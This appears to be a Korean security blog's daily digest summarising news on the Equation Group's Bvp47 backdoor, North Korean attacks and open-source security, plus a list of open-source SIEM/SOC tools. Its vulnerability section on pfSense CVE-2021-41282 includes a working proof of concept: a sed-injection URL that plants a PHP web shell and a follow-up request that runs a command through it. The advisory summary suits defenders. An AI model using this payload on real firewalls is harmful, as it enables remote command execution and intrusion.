---
layout: post
title: 보안기사 이모저모
date: 2022-02-24 09:00:00 +0900
category: SecurityNews
---


# [ Security News ]
---
#### Chinese Experts Uncover Details of Equation Group's Bvp47 Covert Hacking Tool [[link]](https://thehackernews.com/2022/02/chinese-experts-uncover-details-of.html?fbclid=IwAR3XT7BLVJ70_l5QG_mJKfNj_j-6e3A4lhPjj0gop35YpbWvBiD6CmLO7LY)
+ 개요
	- 중국 판구 연구소(Pangu Lab)연구원들이 미국국가안보국(NSA)의 사이버전쟁정보수집부서와 관련있는 APT인 Equation Group의 내용공개
	- 백도어 기능을 하는 Bvp47을 통해 공격방식에 대해 공개하였으나 상세보고서는 부재
		* Equation Group
	- 2001년부터 활동하였으며 사이버 스파이공격의 창시자로 명명(by Kaspersky)된 APT그룹
	- 일부는 Stuxnet에 통합되었으며 정보, 통신, 항공우주, 에너지, 원자력연구, 석유 및 가스, 군사, 나노기술, 금융기관 등을 공격
	- 2016년 Shadow Brokers라고 하는 악성코드 도구셋이 공개되면서 조직정보도 공개
	- 참고자료
		1) Equation Group: The Crown Creator of Cyber-Espionage [link](https://www.kaspersky.com/about/press-releases/2015_equation-group-the-crown-creator-of-cyber-espionage)
		![이미지](1)
+ Bvp47 as a covert backdoor
![이미지](2)
 
+ Links to the Equation Group
	- 2016년 8월 Shadow Brokers가 사용한 GPG암호화 아카이브 파일"eqgrp-auction-file.tar.xz.gpg"에 포함된 Exploit과 중복되어 발생
		ㄴ "eqgrp-auction-file.tar.xz.gpg"(Browsable content of eqgrp-auction-file.tar.xz : https://github.com/x0rz/EQGRP)
	- 'eqgrp-auction-file.tar.xz.gpg'파일 분석과정에서 Bvp47과 압축 패키지에 포함되어 있는 공격 도구는 주로 
		'dewdrops,' 'suctionchar_agents,' 'tipoffs,' 'StoicSurgeon,' 'incision'등이 포함
		ㄴ 'tipoffs’은 Bvp47의 비밀채널에 사용되는 RSA비대칭 알고리즘 개인키가 포함되어 있어 이를 기반으로 공격그룹 확인 가능

#### 사이버공격 우크라이나 걱정할 때 아냐…대통령 선거 겨냥 北 해킹 공격 늘어 [[link]](http://it.chosun.com/site/data/html_dir/2022/02/23/2022022302311.html?fbclid=IwAR2vhPoKiKW3_eVI6uTND1n-7gfe73YNaCC1rIPxw3nzSQsAObJBFnfwW0c)
- 우크라이나와 러시아의 사이버 공격이 고조되고 있으나 국내에서도 메가이벤트들이 즐비하기 때문에 주의 필요

#### 세상 모든 곳에 존재하는 오픈소스만 잡아도 보안은 높게 유지된다 [[link]](https://www.boannews.com/media/view.asp?idx=104962&fbclid=IwAR2G5BhuTk0djJmjmtm9V2E1f46pWCczyrGEwzSu31KLYV7_j8rr_DhOl5E)
+ 오픈소스에 대한 특징 및 보안강화를 위한 대응전략에 대한 기고
	>1. 오픈소스로 인한 공격피해규모와 피해범위 산정 한계
		- 2017년 에퀴팩스(Equifax)라는 대형 신용 모니터링 및 조회 기업에서 오픈소스 관련 데이터 침해 사고가 발생했을 때 1억 5천 명에 가까운 사람들이 피해
		- BUT, 중소 기업에서 주로 사용하는 오픈소스인 에스포CRM(EspoCRM), 핌코어(Pimcore), 어카운팅(Akaunting)에서 취약점이 9개나 발견됐지만 화제성 결여
	2. 오픈소스의 필요성
		- 시간과 투자비용 절감으로 인해 현종하는 웹사이트의 60%가 Aapceh와 NginX기반
	3. 소프트웨어 테스팅 및 보호방안
		- 소스코드 정적분석 스캐닝 및 보안진단(샌드박스인 동적분석 추가)
		- 취약점 발생시 해결프로세스 명확화 : 개발순서, 테스트 방법, 테스팅 기간, 권한 등 명문화(자격 및 등급)
		- 보안문제 규정 및 규칙 수립 필요 : 투자(리눅스재단의 경우 지난 10월 1천만달러 투자를 통해 취약점 발견 및 해결 등 결정)
	3rd Party코드나 연계로 인한 문제를 해결하여 최종적으로 Resillience를 수립하는 것이 중요


# [ Vulnerability ]
---
#### Remote Code Execution in pfSense <= 2.5.2 [[link]](https://www.shielder.it/advisories/pfsense-remote-command-execution/?fbclid=IwAR2S-4XwrZtrdfOtqGCGn1N1p9HnecgBTg2dvPDtNQzrlWZSOQ_tGw6fjlI)
+ CVE : CVE-2021-41282
+ 대상 : FreeBSDLinux 기반 네트워크 방화벽 pfSense
+ 설명 : 공격자가 diag_routes.php를 통해 코드를 실행하기 위해 악용할 수 있는 보안 취약점 존재(pfSense CE 2.6.0또는 pfSense Plus으로 업데이트)
+ 취약점 설명
diag_routes.php [link](https://github.com/pfsense/pfsense/blob/a7086b04cae21ca742fdeefd1019ee1401b6dded/src/usr/local/www/diag_routes.php#L35-L65)
![이미지](3)

	- L51~52에서 요청값(Request)에 filter매개변수가 포함되는 경우 HTML특수문자가 HTML 엔티티로 변환
	- 그 이후 일부 하트도킹된 sed구문이 접두사와 접미사를 붙이고 escapeshellarg함수에 의해 이스케이프되어 하위명령어나 기타 인수가 주입되는 것을 방지
	- L62에서 filter매개변수에 입력한 명령어가 실행
	- 이에서 언급한 내용들은 htmlspecialchars함수를 통해 인코딩되는 제한이 존재하는 임의의 sed구문을 삽입가능하며,
	- 이를 통해 ‘s/match/replace/’명령어를 사용해 netstat출력의 일부를 임의의 문자열로 치환하고 ‘w /path/to/file’명령어를 사용해 sed명령의 출력을 임의의 위치에 쓰는 것(Write)이 가능하게 됨
	- 위에 언급된 모든 내용은 Wrapping하면 공격자가 필터 매개변수에 다음의 문자을을 입력하여 공격 수행
		ㄴ입력하는 명령어 : .*/!d;};s/Destination/\x3c\x3fphp+system($_GET[\x22a\x22])\x3b\x3f\x3e/;w+/usr/local/www/a.php%0a%2
		ㄴ실제 수행되는 명령어 : 
		<pre><code>
		/usr/bin/netstat -rW -f inet | /usr/bin/sed -e '1,3d; 5,\$ { /!d;};s/Destination/\x3c\x3fphp system($_GET[\x22a\x22])\x3b\x3f\x3e/;w /usr/local/www/a.php #/!d; };'
		</code></pre>

+ 공격방법(PoC)
	1. pfSense에 로그인
	2. <target>대상 pfSense 인스턴스의 IP 주소/도메인으로 바꿔 다음 URL을 방문
		pfSense instance: http://<target>/diag_routes.php?isAjax=1&filter=.*/!d;};s/Destination/\x3c\x3fphp+system($_GET[\x22a\x22])\x3b\x3f\x3e/;w+/usr/local/www/a.php%0a%23
	3. <target>대상의 pfSense인스턴스의 IP주소/도메인으로 교체하여 다음 URL에 접근하여 ID명령여가 실행되는지 확인
		<pre><code> http://<target>/a.php?a=id </code></per>


# [ Tools ]
---
#### Apache Metron [[link]](https://github.com/apache/metron)
- 보안 모니터링 및 분석을 위한 중앙 집중식 도구를 제공하기 위해 다양한 오픈 소스 빅 데이터 기술을 통합
- OSS SIEM이라고 생각하면 좋을듯
	+ 참고자료(기고 작성중에 SIEM관련 OSS검색 중에 검색한 내용)
1) THE TOP 14 FREE AND OPEN SOURCE SIEM TOOLS FOR 2021 [link](https://logit.io/blog/post/the-top-14-free-and-open-source-siem-tools-for-2021)
	>1. AlienVault OSSIM
	2. SIEM Monster
	3. Wazuh
	4. Snort
	5. OSSEC
	6. Sagan
	7. Logit.io (ELK기반 SIEM)
	8. Apache Metron
	9. Prelude
	10. Splunk Free
	11. Mozdef
	12. Security Onion
	13. Suricata
	14. Graylog

2) How to Build a SOC With Open Source Solutions? [link](https://socradar.io/how-to-build-a-soc-with-open-source-solutions/)
- Technology : Network monitoring, Endpoint management, Asset discovery, Threat intelligence, Behavioral monitoring, Data loss prevention, Ticketing systems, Policy compliance, Incident response
	> A. SIEM : Apache Metron, AlienVault OSSIM, MozDf, OSSEC, Wzxuhm Prelude OSS, Snort, Sagan, ELK Stack, SIEMonster
	B. Intrusion detection and intrusion prevention (IDS/IPS/IDPS) tools : Snort, Suricata, OSSEC, Secutity Onion, Bro Network Security Monitor, Vistumbler, Smoothwall Express, Untangle NG Firewall, ClamAV
	C. Incident response tools : GRR Rapid Response, Cyphon, Volatility, SIFT(SANS Investigavie Forensics Toolkit) Wokrstaion , The Hive Project
	D. Malware analysis tools : Cuckoo Sandbox, YARA, GRR, The REMnux, Bro
	E. Threat Intelligence Tools : MISP, TIH(Threat Intelligence Hunter), QTek/QRadio, Machine Security Intelligence Collector, SOCRadar Community Edition
	F. Web Application Firewalls : ModSecurity, NAXSI, WebKnight, Shadow Daemon
